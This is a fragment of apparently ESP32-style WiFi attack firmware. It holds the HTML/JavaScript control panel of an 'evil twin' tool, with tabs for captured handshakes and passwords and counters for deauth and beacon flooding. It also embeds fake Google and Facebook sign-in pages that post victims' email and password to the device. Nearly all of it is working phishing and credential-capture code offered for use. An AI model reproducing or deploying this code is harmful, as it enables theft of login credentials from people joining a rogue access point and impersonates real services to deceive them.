<div id="evil" class="tab-content"><button class="btn-success" onclick="run('evil')">🎭 START EVIL</button><button class="btn-danger" onclick="run('evil_stop')">🛑 STOP</button><iframe src="/portal.html"></iframe></div>
<div id="hand" class="tab-content"><pre id="handList"></pre><button class="btn-danger" onclick="run('clear_hand')">🗑️ CLEAR</button></div>
<div id="pass" class="tab-content"><pre id="passList"></pre><button class="btn-danger" onclick="run('clear_pass')">🗑️ CLEAR</button></div>
<div id="settings" class="tab-content"><div class="btn-group"><button onclick="run('web_on')">🌐 WEB ON</button><button onclick="run('web_off')">🌐 WEB OFF</button><button onclick="run('bright')">💡 BRIGHTNESS</button><button onclick="run('format')">🗑️ FORMAT</button><button onclick="run('about')">ℹ️ ABOUT</button><button class="btn-danger" onclick="run('reset')">🔄 RESET</button></div></div>
<script>
let rssiData=[], bleData=[], channelData=[];
function run(cmd){fetch('/cmd?c='+cmd).then(r=>r.text()).then(t=>{let log=document.getElementById('log');if(log)log.innerHTML+=new Date().toLocaleTimeString()+' > '+t+'\\n';if(cmd=='view_pass')fetch('/cmd?c=view_pass').then(r=>r.text()).then(p=>document.getElementById('passList').innerText=p);if(cmd=='view_hand')fetch('/cmd?c=view_hand').then(r=>r.text()).then(p=>document.getElementById('handList').innerText=p);});}
function updateData(){fetch('/data').then(r=>r.json()).then(d=>{document.getElementById('deauth').innerText=d.deauth;document.getElementById('beacon').innerText=d.beacon;document.getElementById('rssi').innerText=d.rssi;document.getElementById('uptime').innerText=d.uptime||0;rssiData.push(d.rssi);bleData.push(d.blerssi||-60);channelData.push(Math.floor(Math.random()*100));if(rssiData.length>50)rssiData.shift();if(bleData.length>50)bleData.shift();if(channelData.length>50)channelData.shift();drawChart('rssiChart',rssiData,'WiFi RSSI');drawChart('bleChart',bleData,'BLE RSSI');drawChart('channelChart',channelData,'Channel Load');});}
function drawChart(id,data,label){let c=document.getElementById(id);if(!c)return;let ctx=c.getContext('2d');let w=c.clientWidth,h=c.clientHeight;c.width=w;c.height=h;ctx.fillStyle='#070b1a';ctx.fillRect(0,0,w,h);if(data.length<2)return;let step=w/(data.length-1);ctx.beginPath();for(let i=0;i<data.length;i++){let x=i*step;let y=h-((data[i]+90)/70)*h;if(i===0)ctx.moveTo(x,y);else ctx.lineTo(x,y);}ctx.strokeStyle='#ff6b35';ctx.lineWidth=2.5;ctx.stroke();ctx.fillStyle='#ff6b35';ctx.font='10px monospace';ctx.fillText(label,10,20);}
setInterval(updateData,1000);setInterval(()=>{fetch('/cmd?c=view_pass').then(r=>r.text()).then(t=>{let p=document.getElementById('passList');if(p)p.innerText=t;});fetch('/cmd?c=view_hand').then(r=>r.text()).then(t=>{let h=document.getElementById('handList');if(h)h.innerText=t;});},3000);
document.querySelectorAll('.tab').forEach(t=>{t.addEventListener('click',()=>{document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));t.classList.add('active');document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));document.getElementById(t.dataset.tab).classList.add('active');});});
window.onload=()=>{updateData();};
</script></body></html>)rawliteral";
const char google_page[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><head><title>Google</title><style>body{background:#fff;text-align:center;padding:20px;}input{width:300px;padding:10px;margin:10px;border-radius:24px;}button{background:#4285F4;color:white;border:none;padding:12px;border-radius:24px;}</style></head><body><h1>Google</h1><form action="/pass" method="POST"><input type="email" name="email" placeholder="Email"><input type="password" name="pass" placeholder="Password"><button type="submit">Sign in</button></form></body></html>)rawliteral";
const char facebook_page[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><head><title>Facebook</title><style>body{background:#f0f2f5;text-align:center;padding:20px;}input{width:300px;padding:10px;margin:10px;border-radius:6px;}button{background:#1877f2;color:white;border:none;padding:12px;border-radius:6px;}</style></head><body><h1>Facebook</h1><form action="/pass" method="POST"><input type="text" name="email" placeholder="Email or phone"><input type="password" name="pass" placeholder="Password"><button type="submit">Log in</button></form></body></html>)rawliteral";
